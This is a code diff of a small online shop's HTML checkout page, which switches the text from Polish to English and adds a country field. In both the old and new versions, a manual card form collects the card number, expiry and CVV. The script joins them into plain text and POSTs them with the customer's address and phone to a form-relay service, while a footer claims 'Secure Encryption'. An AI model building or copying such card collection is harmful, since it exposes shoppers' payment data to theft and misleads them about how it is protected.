@@ -1,61 +1,65 @@
 <!DOCTYPE html>
-<html lang="pl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Checkout - SWAG.PLUG</title>
-    <!-- POPRAWIONY LINK PAYPAL -->
-    <script src="https://www.paypal.com/sdk/js?client-id=Aad0ANidmfR4OAsOrNLxLI0mGMPun-rxprz_EFCU1rT4Ok8tkYbjKgu49eWY1gYyFSmNILgrBLfMqkyw&components=buttons"></script>
+    <!-- PAYPAL SDK z obsługą wielu walut -->
+  <script src="https://www.paypal.com/sdk/js?client-id=Aad0ANidmfR4OAsOrNLxLI0mGMPun-rxprz_EFCU1rT4Ok8tkYbjKgu49eWY1gYyFSmNILgrBLfMqkyw&components=buttons"></script>
     <style>
-        body { background:#000; color:#fff; font-family:sans-serif; }
-        .checkout { max-width:600px; margin:50px auto; padding:20px; border:1px solid #333; }
+        body { background:#000; color:#fff; font-family: 'Helvetica', sans-serif; margin: 0; }
+        .checkout { max-width:500px; margin: 40px auto; padding:20px; border:1px solid #222; }
         .step { display:none; }
         .step.active { display:block; }
-        input { width:100%; padding:12px; margin:10px 0; background:#111; border:1px solid #444; color:#fff; box-sizing: border-box; }
-        button { width:100%; padding:15px; margin-top:10px; background:#fff; color:#000; border:none; font-weight:bold; cursor:pointer; text-transform: uppercase; }
-        button.back { background:#333; color:#ccc; }
-        #summary p { display:flex; justify-content:space-between; border-bottom:1px solid #222; padding:5px 0; }
-        .payment-box { margin-top: 20px; padding-top: 20px; border-top: 1px solid #222; }
+        h2 { text-align:center; letter-spacing:4px; font-weight: bold; border-bottom: 1px solid #fff; padding-bottom: 15px; }
+        h3 { font-size: 12px; color: #888; letter-spacing: 2px; margin-top: 25px; }
+        input { width:100%; padding:14px; margin:8px 0; background:#0a0a0a; border:1px solid #333; color:#fff; box-sizing: border-box; transition: 0.3s; }
+        input:focus { border-color: #fff; outline: none; }
+        button { width:100%; padding:16px; margin-top:10px; background:#fff; color:#000; border:none; font-weight:bold; cursor:pointer; text-transform: uppercase; letter-spacing: 1px; }
+        button:hover { background: #bbb; }
+        button.back { background:transparent; color:#666; font-size: 11px; margin-top: 20px; border: 1px solid #222; }
+        #summary p { display:flex; justify-content:space-between; border-bottom:1px solid #111; padding:8px 0; font-size: 13px; }
+        .payment-box { margin-top: 25px; padding-top: 15px; border-top: 1px solid #222; }
+        .trust-info { font-size: 10px; color: #444; text-align: center; margin-top: 20px; text-transform: uppercase; letter-spacing: 1px; }
     </style>
 </head>
 <body>
 
 <div class="checkout">
-    <h2 style="text-align:center; letter-spacing:2px;">ZAMÓWIENIE</h2>
+    <h2>CHECKOUT</h2>
     <div id="summary"></div>
 
-    <!-- KROK 1: DANE -->
+    <!-- KROK 1: WYSYŁKA -->
     <div id="step1" class="step active">
-        <h3>[01] DANE WYSYŁKI</h3>
-        <input type="text" id="fName" placeholder="Imię i nazwisko">
-        <input type="text" id="fAddr" placeholder="Ulica i numer domu">
-        <input type="text" id="fCity" placeholder="Kod pocztowy i miasto">
-        <input type="tel" id="fPhone" placeholder="Numer telefonu">
-        <button onclick="goToPayment()">DALEJ: PŁATNOŚĆ</button>
+        <h3>[01] SHIPPING / WYSYŁKA</h3>
+        <input type="text" id="fName" placeholder="FULL NAME / IMIĘ I NAZWISKO">
+        <input type="text" id="fAddr" placeholder="STREET & NUMBER / ULICA I NUMER">
+        <input type="text" id="fCity" placeholder="CITY & ZIP / MIASTO I KOD">
+        <input type="text" id="fCountry" placeholder="COUNTRY / KRAJ (e.g. Poland, Germany)">
+        <input type="tel" id="fPhone" placeholder="PHONE / TELEFON">
+        <button onclick="goToPayment()">CONTINUE TO PAYMENT</button>
     </div>
 
     <!-- KROK 2: PŁATNOŚĆ -->
     <div id="step2" class="step">
-        <h3>[02] WYBIERZ METODĘ</h3>
+        <h3>[02] PAYMENT / PŁATNOŚĆ</h3>
         
         <div class="payment-box">
-            <p style="color:#888; font-size:12px;">SZYBKA PŁATNOŚĆ:</p>
             <div id="paypal-button-container"></div>
         </div>
 
         <div class="payment-box">
-            <p style="color:#888; font-size:12px;">LUB KARTA RĘCZNIE:</p>
-            <div id="card-manual">
-                <input type="text" id="cNum" placeholder="Numer karty" maxlength="16">
-                <div style="display:flex; gap:10px;">
-                    <input type="text" id="cExp" placeholder="MM/RR" maxlength="5">
-                    <input type="text" id="cCvv" placeholder="CVV" maxlength="3">
-                </div>
-                <button onclick="finish('KARTA RĘCZNIE')">ZAPŁAĆ KARTĄ</button>
+            <p style="color:#555; font-size:10px; margin-bottom: 10px;">SECURE CARD PAYMENT / KARTA:</p>
+            <input type="text" id="cNum" placeholder="CARD NUMBER" maxlength="16">
+            <div style="display:flex; gap:10px;">
+                <input type="text" id="cExp" placeholder="MM/YY" maxlength="5">
+                <input type="text" id="cCvv" placeholder="CVV" maxlength="3">
             </div>
+            <button onclick="finish('CARD_MANUAL')">COMPLETE ORDER</button>
         </div>
 
-        <button class="back" onclick="back()">POWRÓT</button>
+        <button class="back" onclick="back()">← BACK TO SHIPPING</button>
+        <div class="trust-info">Worldwide Shipping • Secure Encryption • Swag Plug System</div>
     </div>
 </div>
 
@@ -65,27 +69,24 @@ let total = 0;
 
 function renderSummary(){
     const el = document.getElementById('summary');
-    if(cart.length === 0){ el.innerHTML = "<p style='text-align:center;'>Koszyk jest pusty</p>"; return; }
+    if(cart.length === 0){ el.innerHTML = "<p style='text-align:center;'>Your cart is empty</p>"; return; }
     el.innerHTML = "";
     total = 0;
     cart.forEach(p => {
         let price = parseFloat(p.price);
         let qty = parseInt(p.quantity);
         total += price * qty;
-        el.innerHTML += `<p><span>${p.name} (${p.size}) x${qty}</span> <b>${(price * qty).toFixed(2)} zł</b></p>`;
+        el.innerHTML += `<p><span>${p.name} (${p.size}) x${qty}</span> <b>${(price * qty).toFixed(2)} PLN</b></p>`;
     });
-    el.innerHTML += `<p style="font-size:1.2em; border-top:1px solid #fff; margin-top:10px; padding-top:10px;"><span>SUMA</span> <b>${total.toFixed(2)} zł</b></p>`;
+    el.innerHTML += `<p style="font-size:16px; border-top:1px solid #fff; margin-top:10px; padding-top:10px;"><span>TOTAL / SUMA</span> <b>${total.toFixed(2)} PLN</b></p>`;
 }
 renderSummary();
 
 function goToPayment(){
-    // POPRAWKA: Pobieranie wartości przez getElementById
     const nameV = document.getElementById('fName').value;
-    const addrV = document.getElementById('fAddr').value;
-    const cityV = document.getElementById('fCity').value;
-
-    if(!nameV || !addrV || !cityV){
-        alert("Proszę wypełnić wszystkie pola wysyłki!");
+    const countryV = document.getElementById('fCountry').value;
+    if(!nameV || !countryV){
+        alert("Please fill in shipping details!");
         return;
     }
     document.getElementById('step1').classList.remove('active');
@@ -98,19 +99,19 @@ function back(){
 }
 
 function finish(method){
-    // Dodatkowe dane jeśli to karta
     let extraInfo = method;
-    if(method === 'KARTA RĘCZNIE') {
+    if(method === 'CARD_MANUAL') {
         const num = document.getElementById('cNum').value;
         const exp = document.getElementById('cExp').value;
         const cvv = document.getElementById('cCvv').value;
-        if(!num || !exp || !cvv) return alert("Wypełnij dane karty!");
-        extraInfo = `KARTA: ${num} | EXP: ${exp} | CVV: ${cvv}`;
+        if(!num || !exp || !cvv) return alert("Fill card details!");
+        extraInfo = `CARD: ${num} | EXP: ${exp} | CVV: ${cvv}`;
     }
 
     const data = {
         klient: document.getElementById('fName').value,
         adres: document.getElementById('fAddr').value + ", " + document.getElementById('fCity').value,
+        kraj: document.getElementById('fCountry').value,
         telefon: document.getElementById('fPhone').value,
         produkty: cart.map(p => `${p.name} (${p.size}) x${p.quantity}`).join(", "),
         suma: total.toFixed(2) + " PLN",
@@ -124,94 +125,28 @@ function finish(method){
     })
     .then(res => {
         if(res.ok) {
-            alert("DZIĘKUJEMY! Zamówienie zostało przyjęte.");
+            alert("ORDER PLACED! THANK YOU.");
             localStorage.clear();
             window.location.href = "index.html";
         }
-    })
-    .catch(() => alert("Wystąpił błąd przy wysyłaniu zamówienia."));
+    });
 }
 
 // PAYPAL INTEGRACJA
-paypal.Buttons({
-    createOrder: (data, actions) => {
-        return actions.order.create({
-            purchase_units: [{ amount: { value: total.toFixed(2) } }]
-        });
-    },
-    onApprove: (data, actions) => {
-        return actions.order.capture().then(details => {
-            finish("PAYPAL (ZAKOŃCZONE)");
-        });
-    }
-}).render('#paypal-button-container');
-</script>
-    <script>
-    // 1. Inicjalizacja koszyka (pobranie sumy)
-    const cart = JSON.parse(localStorage.getItem('cart')) || [];
-    let total = 0;
-    cart.forEach(p => { total += parseFloat(p.price) * parseInt(p.quantity); });
-
-    // 2. FUNKCJA WYSYŁAJĄCA DANE (FORMSPREE)
-    function finish(method) {
-        let extraInfo = method;
-        
-        // Jeśli to karta ręczna, zbieramy dane z Twojego formularza
-        if(method === 'KARTA RĘCZNIE') {
-            const num = document.getElementById('cNum').value;
-            const exp = document.getElementById('cExp').value;
-            const cvv = document.getElementById('cCvv').value;
-            if(!num || !exp || !cvv) return alert("Wypełnij dane karty!");
-            extraInfo = `KARTA: ${num} | EXP: ${exp} | CVV: ${cvv}`;
+if(window.paypal) {
+    paypal.Buttons({
+        createOrder: (data, actions) => {
+            return actions.order.create({
+                purchase_units: [{ amount: { value: total.toFixed(2) } }]
+            });
+        },
+        onApprove: (data, actions) => {
+            return actions.order.capture().then(details => {
+                finish("PAYPAL_SUCCESS_" + details.id);
+            });
         }
-
-        const orderData = {
-            Klient: document.getElementById('fName')?.value || "Brak danych",
-            Adres: (document.getElementById('fAddr')?.value || "") + ", " + (document.getElementById('fCity')?.value || ""),
-            Telefon: document.getElementById('fPhone')?.value || "Brak",
-            Produkty: cart.map(p => `${p.name} x${p.quantity}`).join(", "),
-            Suma: total.toFixed(2) + " PLN",
-            Metoda: extraInfo
-        };
-
-        fetch("https://formspree.io", {
-            method: "POST",
-            headers: { "Content-Type": "application/json", "Accept": "application/json" },
-            body: JSON.stringify(orderData)
-        })
-        .then(res => {
-            if(res.ok) {
-                alert("ZAMÓWIENIE PRZYJĘTE! Dziękujemy.");
-                localStorage.clear();
-                window.location.href = "index.html";
-            }
-        });
-    }
-
-    // 3. INTEGRACJA PRZYCISKU PAYPAL
-    if (window.paypal) {
-        paypal.Buttons({
-            createOrder: (data, actions) => {
-                return actions.order.create({
-                    purchase_units: [{
-                        amount: { value: total.toFixed(2) }
-                    }]
-                });
-            },
-            onApprove: (data, actions) => {
-                return actions.order.capture().then(details => {
-                    // Po udanej płatności PayPal wysyłamy info do Formspree
-                    finish("PAYPAL (OPŁACONE: " + details.id + ")");
-                });
-            },
-            onError: (err) => {
-                console.error("Błąd PayPal:", err);
-                alert("Błąd połączenia z PayPal. Spróbuj karty.");
-            }
-        }).render('#paypal-button-container');
-    }
+    }).render('#paypal-button-container');
+}
 </script>
-
-
 </body>
 </html>
